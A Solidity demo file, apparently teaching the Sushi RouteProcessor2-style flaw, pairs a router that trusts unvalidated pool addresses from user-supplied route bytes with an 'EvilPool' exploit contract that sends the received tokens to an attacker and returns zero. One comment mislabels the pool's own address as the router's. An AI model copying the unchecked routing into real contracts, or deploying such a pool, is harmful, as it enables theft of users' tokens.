// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20Mini {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

// Minimal DEX pool interface for demo
interface IPool {
    function swap(
        IERC20Mini tokenIn,
        IERC20Mini tokenOut,
        uint256 amountIn,
        address to
    ) external returns (uint256 amountOut);
}

// Sushi RouteProcessor2-style router that trusts user-supplied `route` bytes
// VULNERABLE: no validation of pool addresses embedded in `route`
contract SushiLikeRouter {
    // `route` = abi.encode(address pool)
    function processRoute(
        IERC20Mini tokenIn,
        uint256 amountIn,
        IERC20Mini tokenOut,
        uint256 minAmountOut,
        address to,
        bytes calldata route
    ) external returns (uint256 amountOut) {
        // Take tokens from user (user must have approved router)
        require(tokenIn.transferFrom(msg.sender, address(this), amountIn), "pull failed");

        // Decode pool address from user-provided data
        // VULNERABLE: no whitelist / sanity checks
        address poolAddr = abi.decode(route, (address));
        IPool pool = IPool(poolAddr);

        require(tokenIn.transfer(poolAddr, amountIn), "send to pool failed");

        // Approve and call arbitrary pool
        amountOut = pool.swap(tokenIn, tokenOut, amountIn, to);

        require(amountOut >= minAmountOut, "slippage");
    }
}

// Malicious pool used in the exploit
// Router calls this because `route` points here
contract EvilPool is IPool {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function swap(
        IERC20Mini tokenIn,
        IERC20Mini /*tokenOut*/,
        uint256 /*amountIn*/,
        address /*to*/
    ) external override returns (uint256 amountOut) {
        // Ignore tokenOut / to completely. Just steal everything
        uint256 poolBalance = tokenIn.balanceOf(address(this)); // router's address
        // Drain all of tokenIn held by router to attacker
        tokenIn.transfer(attacker, poolBalance);

        // Return 0 to router (victim gets nothing)
        return 0;
    }
}
